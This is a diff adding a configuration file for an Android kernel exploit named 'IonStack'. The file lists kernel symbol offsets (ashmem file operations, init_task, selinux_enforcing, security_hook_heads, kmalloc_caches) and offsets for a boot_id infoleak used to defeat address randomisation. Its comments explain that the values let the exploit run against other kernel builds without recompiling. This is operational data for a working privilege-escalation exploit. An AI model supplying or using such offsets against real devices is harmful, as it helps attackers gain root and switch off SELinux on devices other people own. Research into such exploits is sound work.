@@ -1,0 +1,45 @@
+# IonStack kernel symbol overrides
+#
+# Push to /data/local/tmp/ionstack.conf (or point $IONSTACK_CONFIG at
+# it) to run the exploit against a different kernel build without
+# recompiling. Values are hex or decimal; keys not listed keep their
+# built-in defaults (shown below for eureka-52168470043600520).
+#
+# kimage_text_base is the absolute link-time base; every other key is
+# an offset relative to it, so overriding only kimage_text_base shifts
+# all symbols at once.
+
+kimage_text_base            = 0xffffffc008000000
+
+# file_operations / function pointers
+random_misc_fops_off        = 0x1e914b8
+ashmem_misc_fops_off        = 0x2819688
+ashmem_fops_off             = 0x01ec87e0
+ashmem_ioctl_off            = 0x143a040
+ashmem_compat_ioctl_off     = 0x143a048
+ashmem_mmap_off             = 0x1425460
+ashmem_open_off             = 0x1434fe8
+ashmem_release_off          = 0x1434ff0
+ashmem_show_fdinfo_off      = 0x14255d8
+ashmem_read_iter_off        = 0x1425360
+configfs_read_file_off      = 0x1434078
+configfs_write_bin_file_off = 0x1434448
+copy_splice_read_off        = 0x1425548
+noop_llseek_off             = 0x1422748
+
+# kernel variables
+init_task_off               = 0x027ec200
+init_uts_ns_off             = 0x02839928
+empty_zero_page_off         = 0x028ec000
+root_task_group_off         = 0x028f0700
+selinux_blob_sizes_off      = 0x01f04db0
+selinux_enforcing_off       = 0x02942198
+security_hook_heads_off     = 0x01f029d0
+kmalloc_caches_off          = 0x01f057f0
+anon_pipe_buf_ops_off       = 0x01db0d28
+
+# slide (boot_id infoleak) variables
+slide_random_boot_id_data_off = 0x27e6478
+slide_sysctl_bootid_off       = 0x02a4f1d9
+slide_loggers_0_1_off         = 0x26eed80
+slide_nfulnl_logger_off       = 0x026eee50
